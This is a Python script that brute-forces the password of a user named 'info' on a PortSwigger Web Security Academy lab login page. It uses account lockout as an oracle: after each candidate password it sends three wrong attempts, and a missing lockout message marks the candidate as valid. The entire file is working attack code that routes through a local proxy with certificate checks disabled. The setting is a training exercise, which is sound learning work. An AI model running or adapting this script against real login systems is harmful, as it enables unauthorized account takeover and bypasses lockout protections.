import requests
import sys
import time

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIGURATION ---
LAB_URL = "https://YOUR-LAB-ID.web-security-academy.net/"
LOGIN_URL = f"{LAB_URL}login"
PASSWORD_FILE = "passwords.txt"
TARGET_USER = "info"  # Successfully found from your previous run!

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def read_file(filename):
    try:
        with open(filename, "r") as f:
            return [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        print(f"[-] Error: '{filename}' not found.")
        sys.exit(1)

def main():
    passwords = read_file(PASSWORD_FILE)
    print(f"[*] Commencing oracle analysis for {len(passwords)} passwords against user '{TARGET_USER}'...")
    print("[*] Please wait—this method evaluates the lock status per password...")

    for count, password in enumerate(passwords, 1):
        # Fresh standalone session state per candidate password
        session = requests.Session()
        
        # Step 1: Send the candidate password
        data = {"username": TARGET_USER, "password": password}
        response = session.post(LOGIN_URL, data=data, proxies=proxies, verify=False, allow_redirects=False)
        
        # Immediate Win condition if the lab is completely reset
        if response.status_code == 302:
            print(f"\n[+] SUCCESS! Match found -> {TARGET_USER}:{password}")
            return

        # Step 2: Send 3 guaranteed-wrong attempts right after it
        is_locked = False
        for _ in range(3):
            data_lock = {"username": TARGET_USER, "password": "definitely_not_the_password_123"}
            res_lock = session.post(LOGIN_URL, data=data_lock, proxies=proxies, verify=False)
            if "too many incorrect login attempts" in res_lock.text.lower():
                is_locked = True
                break
        
        # Step 3: Analyze the behavior
        # If 4 total requests failed to lock the account, the 1st candidate password was valid!
        if not is_locked:
            print(f"\n[+] SUCCESS! Identified valid password via lock-bypass -> {TARGET_USER}:{password}")
            print("[!] Note: Wait exactly 1 minute for the lockout to clear before logging into the browser.")
            return

        sys.stdout.write(f"\r[*] Analyzed {count}/{len(passwords)} passwords...")
        sys.stdout.flush()
        
        # Small delay to keep the connection clean
        time.sleep(0.05)

    print("\n[-] Password extraction complete. No valid match found.")

if __name__ == "__main__":
    main()
